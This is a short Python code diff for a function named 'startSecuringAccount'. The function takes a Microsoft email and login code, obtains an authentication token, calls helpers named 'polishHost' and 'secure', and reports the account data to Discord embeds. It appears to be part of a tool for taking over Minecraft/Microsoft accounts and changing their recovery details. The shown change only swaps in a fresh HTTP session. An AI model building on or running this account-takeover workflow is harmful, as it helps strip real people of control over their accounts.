@@ -3,6 +3,7 @@ from views.utils.minecraft.getDonut import getDonutStats
 from views.utils.securing.getLiveData import getLiveData
 from views.utils.securing.polishHost import polishHost
 from views.utils.minecraft.simplify import simplify
+from views.utils.initialSession import getSession
 from views.utils.securing.secure import secure
 from views.utils.getMSAAUTH import getMSAAUTH
 from urllib.parse import quote
@@ -13,8 +14,10 @@ import time
 async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
     # Handles the data to be displayed in embeds to discord
     
-    data = await getLiveData(session)
-    msaauth = await getMSAAUTH(session, email, device, data, code)
+    fresh_session = getSession()
+    
+    data = await getLiveData(fresh_session)
+    msaauth = await getMSAAUTH(fresh_session, email, device, data, code)
     
     account = {
         "microsoft": {
@@ -47,8 +50,8 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
         account["microsoft"]["email"] = "Child Locked"
         account["microsoft"]["security_email"] = "Child Locked"
     else:
-        await polishHost(session, msaauth)
-        account = await secure(session, recovery, account)
+        await polishHost(fresh_session, msaauth)
+        account = await secure(fresh_session, recovery, account)
 
     finalTime = (time.time() - initialTime)
 
